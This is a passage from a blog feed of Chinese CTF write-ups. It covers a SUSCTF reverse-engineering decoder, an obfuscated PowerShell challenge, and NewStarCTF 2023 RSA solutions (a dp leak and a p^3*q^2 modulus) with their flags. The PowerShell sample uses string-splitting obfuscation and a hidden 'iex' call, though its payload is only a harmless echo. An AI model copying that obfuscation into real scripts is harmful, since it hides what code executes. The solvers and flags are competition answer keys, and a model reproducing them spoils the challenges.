data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>unk_ <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x6C</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x3</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x26</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X59</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X39</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X6A</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X42</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X26</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X6B</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X45</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X31</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X44</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X7</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X7</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X4C</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X68</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X2D</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X5F</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X6C</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X56</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X6E</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X2D</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X6A</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X49</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X5A</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X75</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    v6 <span class=\"token operator\">=</span> unk_<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    unk_<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> unk_<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    unk_<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v6</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">31</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    unk_<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span><span class=\"token operator\">=</span> unk_<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>unk_<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>chars <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> num <span class=\"token keyword\">in</span> unk_<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>chars<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>运行结果如下：</p>\n<p><img data-src=\"image-20231014214422191.png\" alt=\"image-20231014214422191\"></p>\n<p><code>susctf&#123;6r347_7h15_15_4n_345y_r3_f0r_y0u&#125;</code></p>\n<h3 id=\"babypowershell\"><a class=\"markdownIt-Anchor\" href=\"#babypowershell\">#</a> babyPowerShell</h3>\n<p>题目如下所示：</p>\n<pre><code>('w'+(&quot;&#123;0&#125;&#123;1&#125;&quot; -f 'yes','us')+'c'+'tf'+'&#123;Pow'+(&quot;&#123;1&#125;&#123;0&#125;&#123;2&#125;&quot; -f'shel','er','l')+'_'+'i'+(&quot;&#123;0&#125;&#123;1&#125;&quot;-f'sss','s')+'ss'+(&quot;&#123;2&#125;&#123;0&#125;&#123;1&#125;&quot; -f 's','sss_v','ss')+(&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;-f '_ez_f','err','y')+'o'+'rrr'+'r'+'rr'+'r'+'r_you&#125;'+(&quot;&#123;1&#125;&#123;0&#125;&quot; -f 'zZRout','wye')+(&quot;&#123;0&#125;&#123;1&#125;&quot;-f'-nul','l')).REPLAce('zZR',[StRing][CHAR]124).REPLAce(([CHAR]119+[CHAR]121+[CHAR]101),[StRing][CHAR]34)|.( $EnV:COMsPEC[4,26,25]-JoiN'')\n</code></pre>\n<p>该命令等价于：</p>\n<p><img data-src=\"image-20231015172532919.png\" alt=\"image-20231015172532919\"></p>\n<p>因此 flag 为： <code>susctf&#123;Powershell_issssssssssss_verry_ez_forrrrrrrr_you&#125;</code></p>\n",
            "tags": [
                "SUSCTF"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/15/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20Crypto%20Week2/",
            "url": "http://yanagi-kon.github.io/2023/10/15/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20Crypto%20Week2/",
            "title": "NewStarCTF 2023 公开赛道 Week2",
            "date_published": "2023-10-15T09:06:00.000Z",
            "content_html": "<h1 id=\"newstarctf-2023-公开赛道-week2\"><a class=\"markdownIt-Anchor\" href=\"#newstarctf-2023-公开赛道-week2\">#</a> NewStarCTF 2023 公开赛道 Week2</h1>\n<h2 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"滴啤\"><a class=\"markdownIt-Anchor\" href=\"#滴啤\">#</a> 滴啤</h3>\n<p><strong>考点：dp 泄露</strong></p>\n<p>题目如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> flag <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">gen_prime</span><span class=\"token punctuation\">(</span>number<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span>number<span class=\"token operator\">//</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span>number<span class=\"token operator\">//</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">,</span>q</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">,</span>q <span class=\"token operator\">=</span> gen_prime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">*</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>d<span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>p<span class=\"token operator\">*</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># 93172788492926438327710592564562854206438712390394636149385608321800134934361353794206624031396988124455847768883785503795521389178814791213054124361007887496351504099772757164211666778414800698976335767027868761735533195880182982358937211282541379697714874313863354097646233575265223978310932841461535936931</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># 307467153394842898333761625034462907680907310539113349710634557900919735848784017007186630645110812431448648273172817619775466967145608769260573615221635</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># 52777705692327501332528487168340175436832109866218597778822262268417075157567880409483079452903528883040715097136293765188858187142103081639134055997552543213589467751037524482578093572244313928030341356359989531451789166815462417484822009937089058352982739611755717666799278271494933382716633553199739292089</span></pre></td></tr></table></figure><p>现在已知：n、dp (d mod (p-1))、c、e</p>\n<p>一般的 RSA 题目不会给出 dp，因此本题属于 dp 泄露，利用 dp 求出其余元素，进而得到最终的答案：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from flag import flag</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">gen_prime</span><span class=\"token punctuation\">(</span>number<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span>number<span class=\"token operator\">//</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span>number<span class=\"token operator\">//</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">,</span>q</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getd</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>dp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>dp<span class=\"token operator\">*</span>e<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>i <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            p <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>dp<span class=\"token operator\">*</span>e<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">//</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">if</span> n <span class=\"token operator\">%</span> p <span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                q <span class=\"token operator\">=</span> n <span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                phi<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                <span class=\"token keyword\">return</span> d</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">93172788492926438327710592564562854206438712390394636149385608321800134934361353794206624031396988124455847768883785503795521389178814791213054124361007887496351504099772757164211666778414800698976335767027868761735533195880182982358937211282541379697714874313863354097646233575265223978310932841461535936931</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>dp <span class=\"token operator\">=</span> <span class=\"token number\">307467153394842898333761625034462907680907310539113349710634557900919735848784017007186630645110812431448648273172817619775466967145608769260573615221635</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">52777705692327501332528487168340175436832109866218597778822262268417075157567880409483079452903528883040715097136293765188858187142103081639134055997552543213589467751037524482578093572244313928030341356359989531451789166815462417484822009937089058352982739611755717666799278271494933382716633553199739292089</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>d <span class=\"token operator\">=</span> getd<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>dp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>flag 为： <code>flag&#123;cd5ff82d-989c-4fbf-9543-3f98ab567546&#125;</code></p>\n<h3 id=\"不止一个pi\"><a class=\"markdownIt-Anchor\" href=\"#不止一个pi\">#</a> 不止一个 pi</h3>\n<p>题目：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> flag <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">**</span><span class=\"token number\">3</span><span class=\"token operator\">*</span>q<span class=\"token operator\">**</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"q = \"</span><span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"p = \"</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span><span class=\"token number\">65537</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c = \"</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># q =  115478867870347527660680329271012852043845868401928361076102779938370270670897498759391844282137149013845956612257534640259997979275610235395706473965973203544920469416283181677660262509481282536465796731401967694683575843183509430017972506752901270887444490905891490955975762524187534052478173966117471143713</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># p =  171790960371317244087615913047696670778115765201883835525456016207966048658582417842936925149582378305610304505530997833147251832289276125084339614808085356814202236463900384335878760177630501950384919794386619363394169016560485152083893183420911295712446925318391793822371390439655160077212739260871923935217</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># c =  4459183928324369762397671605317600157512712503694330767938490496225669985050002776253470841193156951087663107866714426230222002399666306287642591077990897883174134404896800482234781531592939043551832049756571987010173667074168282355520711905659013076509353523088583347373358980842707686611157050425584598825151399870268083867269912139634929397957514376826145870752116583185351576051776627208882377413433140577461314504762388617595282085102271510792305560608934353515552201553674287954987323321512852114353266359364282603487098916608302944694600227628787791876600901537888110093703612414836676571562487005330299996908873589228072982641114844761980143047920770114535924959765518365614709272297666231481655857243004072049094078525569460293381479558148506346966064906164209362147313371962567040047084516510135054571080612077333228195608109065475260832580192321853906138811139036658485688320161530131239854003996457871663456850196483520239675981391047452381998620386899101820782421605287708727667663038905378115235163773867508258208867367314108701855709002634592329976912239956212490788262396106230191754680813790425433763427315230330459349320412354189010684525105318610102936715203529222491642807382215023468936755584632849348996666528981269240867612068382243822300418856599418223875522408986596925018975565057696218423036459144392625166761522424721268971676010427096379610266649911939139451989246194525553533699831110568146220347603627745407449761792135898110139743498767543521297525802809254842518002190381508964357001211353997061417710783337</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># e = 65537</span></pre></td></tr></table></figure><p><strong>本题目如果直接使用 c,d,n 进行求解的话无法给出正确答案 (原因？)</strong>。可以用中国剩余定理进行求解，但是不清楚为什么虽然 n 是由多个素数：p，p，p，q，q 组成的，但是只用了 p 和 q 进行了一次中国剩余定理就得到了正确答案，可能因为本质上只是有两个元素 p，q？？：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># from flag import flag</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>q <span class=\"token operator\">=</span>  <span class=\"token number\">115478867870347527660680329271012852043845868401928361076102779938370270670897498759391844282137149013845956612257534640259997979275610235395706473965973203544920469416283181677660262509481282536465796731401967694683575843183509430017972506752901270887444490905891490955975762524187534052478173966117471143713</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p <span class=\"token operator\">=</span>  <span class=\"token number\">171790960371317244087615913047696670778115765201883835525456016207966048658582417842936925149582378305610304505530997833147251832289276125084339614808085356814202236463900384335878760177630501950384919794386619363394169016560485152083893183420911295712446925318391793822371390439655160077212739260871923935217</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">**</span><span class=\"token number\">3</span><span class=\"token operator\">*</span>q<span class=\"token operator\">**</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">**</span><span class=\"token number\">3</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">**</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>c <span class=\"token operator\">=</span>  <span class=\"token number\">4459183928324369762397671605317600157512712503694330767938490496225669985050002776253470841193156951087663107866714426230222002399666306287642591077990897883174134404896800482234781531592939043551832049756571987010173667074168282355520711905659013076509353523088583347373358980842707686611157050425584598825151399870268083867269912139634929397957514376826145870752116583185351576051776627208882377413433140577461314504762388617595282085102271510792305560608934353515552201553674287954987323321512852114353266359364282603487098916608302944694600227628787791876600901537888110093703612414836676571562487005330299996908873589228072982641114844761980143047920770114535924959765518365614709272297666231481655857243004072049094078525569460293381479558148506346966064906164209362147313371962567040047084516510135054571080612077333228195608109065475260832580192321853906138811139036658485688320161530131239854003996457871663456850196483520239675981391047452381998620386899101820782421605287708727667663038905378115235163773867508258208867367314108701855709002634592329976912239956212490788262396106230191754680813790425433763427315230330459349320412354189010684525105318610102936715203529222491642807382215023468936755584632849348996666528981269240867612068382243822300418856599418223875522408986596925018975565057696218423036459144392625166761522424721268971676010427096379610266649911939139451989246194525553533699831110568146220347603627745407449761792135898110139743498767543521297525802809254842518002190381508964357001211353997061417710783337</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"q = \"</span><span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"p = \"</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>dp <span class=\"token operator\">=</span> d <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>dq <span class=\"token operator\">=</span> d <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Cp <span class=\"token operator\">=</span> c <span class=\"token operator\">%</span> p</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>Cq <span class=\"token operator\">=</span> c <span class=\"token operator\">%</span> q</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>qInv <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>mp <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>Cp<span class=\"token punctuation\">,</span>dp<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>mq <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>Cq<span class=\"token punctuation\">,</span>dq<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>h <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>qInv<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>mp<span class=\"token operator\">-</span>mq<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>p</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>m12 <span class=\"token operator\">=</span> mq <span class=\"token operator\">+</span> h<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m12<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># c =  4459183928324369762397671605317600157512712503694330767938490496225669985050002776253470841193156951087663107866714426230222002399666306287642591077990897883174134404896800482234781531592939043551832049756571987010173667074168282355520711905659013076509353523088583347373358980842707686611157050425584598825151399870268083867269912139634929397957514376826145870752116583185351576051776627208882377413433140577461314504762388617595282085102271510792305560608934353515552201553674287954987323321512852114353266359364282603487098916608302944694600227628787791876600901537888110093703612414836676571562487005330299996908873589228072982641114844761980143047920770114535924959765518365614709272297666231481655857243004072049094078525569460293381479558148506346966064906164209362147313371962567040047084516510135054571080612077333228195608109065475260832580192321853906138811139036658485688320161530131239854003996457871663456850196483520239675981391047452381998620386899101820782421605287708727667663038905378115235163773867508258208867367314108701855709002634592329976912239956212490788262396106230191754680813790425433763427315230330459349320412354189010684525105318610102936715203529222491642807382215023468936755584632849348996666528981269240867612068382243822300418856599418223875522408986596925018975565057696218423036459144392625166761522424721268971676010427096379610266649911939139451989246194525553533699831110568146220347603627745407449761792135898110139743498767543521297525802809254842518002190381508964357001211353997061417710783337</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># e = 65537</span></pre></td></tr></table></figure><p><code>flag&#123;bu_zhi_yige_p1dsaf&#125;</code></p>\n<h2 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> Web</h2>\n<h3 